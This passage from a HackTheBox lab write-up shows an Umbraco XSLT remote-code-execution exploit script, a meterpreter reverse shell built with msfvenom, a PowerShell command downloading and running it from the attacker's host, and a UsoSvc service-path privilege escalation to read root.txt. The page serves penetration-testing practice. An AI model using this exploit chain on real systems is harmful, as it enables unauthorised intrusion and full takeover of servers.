</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span><span style=color:#e6db74>&lt;?xml version=&#34;1.0&#34;?&gt;&lt;xsl:stylesheet version=&#34;1.0&#34; xmlns:xsl=&#34;http://www.w3.org/1999/XSL/Transform&#34; xmlns:msxsl=&#34;urn:schemas-microsoft-com:xslt&#34; xmlns:csharp_user=&#34;http://csharp.mycompany.com/mynamespace&#34;&gt;&lt;msxsl:script language=&#34;C#&#34; implements-prefix=&#34;csharp_user&#34;&gt;public string xml() { string cmd = &#34;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = &#34;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  &lt;/msxsl:script&gt;&lt;xsl:template match=&#34;/&#34;&gt; &lt;xsl:value-of select=&#34;csharp_user:xml()&#34;/&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt;</span><span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span><span style=color:#e6db74>&#34;&#34;&#34;</span> <span style=color:#f92672>%</span> (args<span style=color:#f92672>.</span>arguments, args<span style=color:#f92672>.</span>command)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>login <span style=color:#f92672>=</span> args<span style=color:#f92672>.</span>user
</span></span><span style=display:flex><span>password <span style=color:#f92672>=</span> args<span style=color:#f92672>.</span>password
</span></span><span style=display:flex><span>host <span style=color:#f92672>=</span> args<span style=color:#f92672>.</span>url
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Process Login</span>
</span></span><span style=display:flex><span>url_login <span style=color:#f92672>=</span> host <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;/umbraco/backoffice/UmbracoApi/Authentication/PostLogin&#34;</span>
</span></span><span style=display:flex><span>loginfo <span style=color:#f92672>=</span> { <span style=color:#e6db74>&#34;username&#34;</span>: login, <span style=color:#e6db74>&#34;password&#34;</span>: password}
</span></span><span style=display:flex><span>s <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>session()
</span></span><span style=display:flex><span>r2 <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>post(url_login,json<span style=color:#f92672>=</span>loginfo)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Go to vulnerable web page</span>
</span></span><span style=display:flex><span>url_xslt <span style=color:#f92672>=</span> host <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;/umbraco/developer/Xslt/xsltVisualize.aspx&#34;</span>
</span></span><span style=display:flex><span>r3 <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>get(url_xslt)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>soup <span style=color:#f92672>=</span> BeautifulSoup(r3<span style=color:#f92672>.</span>text, <span style=color:#e6db74>&#39;html.parser&#39;</span>)
</span></span><span style=display:flex><span>VIEWSTATE <span style=color:#f92672>=</span> soup<span style=color:#f92672>.</span>find(id<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;__VIEWSTATE&#34;</span>)[<span style=color:#e6db74>&#39;value&#39;</span>]
</span></span><span style=display:flex><span>VIEWSTATEGENERATOR <span style=color:#f92672>=</span> soup<span style=color:#f92672>.</span>find(id<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;__VIEWSTATEGENERATOR&#34;</span>)[<span style=color:#e6db74>&#39;value&#39;</span>]
</span></span><span style=display:flex><span>UMBXSRFTOKEN <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>cookies[<span style=color:#e6db74>&#39;UMB-XSRF-TOKEN&#39;</span>]
</span></span><span style=display:flex><span>headers <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#39;UMB-XSRF-TOKEN&#39;</span>: UMBXSRFTOKEN}
</span></span><span style=display:flex><span>data <span style=color:#f92672>=</span> { <span style=color:#e6db74>&#34;__EVENTTARGET&#34;</span>: <span style=color:#e6db74>&#34;&#34;</span>, <span style=color:#e6db74>&#34;__EVENTARGUMENT&#34;</span>: <span style=color:#e6db74>&#34;&#34;</span>, <span style=color:#e6db74>&#34;__VIEWSTATE&#34;</span>: VIEWSTATE,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;__VIEWSTATEGENERATOR&#34;</span>: VIEWSTATEGENERATOR,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;ctl00$body$xsltSelection&#34;</span>: payload,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;ctl00$body$contentPicker$ContentIdValue&#34;</span>: <span style=color:#e6db74>&#34;&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;ctl00$body$visualizeDo&#34;</span>: <span style=color:#e6db74>&#34;Visualize+XSLT&#34;</span> }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Launch the attack</span>
</span></span><span style=display:flex><span>r4 <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>post(url_xslt, data<span style=color:#f92672>=</span>data, headers<span style=color:#f92672>=</span>headers)
</span></span><span style=display:flex><span><span style=color:#75715e># Filter output</span>
</span></span><span style=display:flex><span>soup <span style=color:#f92672>=</span> BeautifulSoup(r4<span style=color:#f92672>.</span>text, <span style=color:#e6db74>&#39;html.parser&#39;</span>)
</span></span><span style=display:flex><span>CMDOUTPUT <span style=color:#f92672>=</span> soup<span style=color:#f92672>.</span>find(id<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;result&#34;</span>)<span style=color:#f92672>.</span>getText()
</span></span><span style=display:flex><span>print(CMDOUTPUT)
</span></span></code></pre></div><p>This time we can generate an exe reverse shell (rather than aspx webshell),
use the above RCE exploit to get a powershell shell, upload the reverse shell,
and gain shell access:</p><pre tabindex=0><code>$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.222 LPORT=9999 -f exe &gt; reverse.exe
$ python -m http.server --bind 10.10.15.222 8080
$ python exploit.py -u admin@htb.local -p baconandcheese -i &#39;http://10.10.10.180&#39; -c powershell.exe -a &#39;-NoProfile -Command ls&#39;

    Directory: C:\windows\system32\inetsrv

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/19/2020   3:11 PM                Config
d-----        2/19/2020   3:11 PM                en
d-----        2/19/2020   3:11 PM                en-US
...

$ python exploit.py -u admin@htb.local -p baconandcheese -i &#39;http://10.10.10.180&#39; -c powershell.exe -a &#39;-NoProfile -Command wget http://10.10.15.222:8080/reverse.exe -OutFile C:/Users/Public/cyfun.exe&#39;
$ python exploit.py -u admin@htb.local -p baconandcheese -i &#39;http://10.10.10.180&#39; -c powershell.exe -a &#39;-NoProfile -Command C:/Users/Public/cyfun.exe&#39;

PS C:\windows\system32\inetsrv&gt; gc C:/Users/Public/user.txt
8eb35aa443795d5f4f306c100344e0d7
</code></pre><h2 id=privilege-escalation-of-machine>Privilege Escalation of Machine<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine>#</a></h2><p>Some enumeration tools show exploitable services like <code>UsoSvc</code> so I found an
article explaining the attack:
<a href=https://www.nccgroup.com/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/>CVE-2019-1405 and CVE-2019-1322 - Elevation to SYSTEM via the UPnP Device Host Service and the Update Orchestrator Service</a>.</p><pre tabindex=0><code>sc config UsoSvc binpath= &#34;cmd.exe /c copy C:\\Users\\Administrator\\Desktop\\root.txt C:\\windows\\system32\\cyfun.txt &amp;&#34;
sc config UsoSvc binpath= &#34;cmd.exe /c copy del C:\\windows\\system32\\cyfun.txt &amp;&#34;
C:\windows\system32\inetsrv&gt;type C:\windows\system32\cyfun.txt
9421fa1e9e59dd1a93d10a7efd87b5c2

sc config UsoSvc binpath= &#34;cmd.exe /c del C:\\windows\\system32\\cyfun.txt &amp;&#34;
</code></pre></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/windows/>Windows</a></li><li><a href=https://s4ch.github.io/tags/easy/>Easy</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>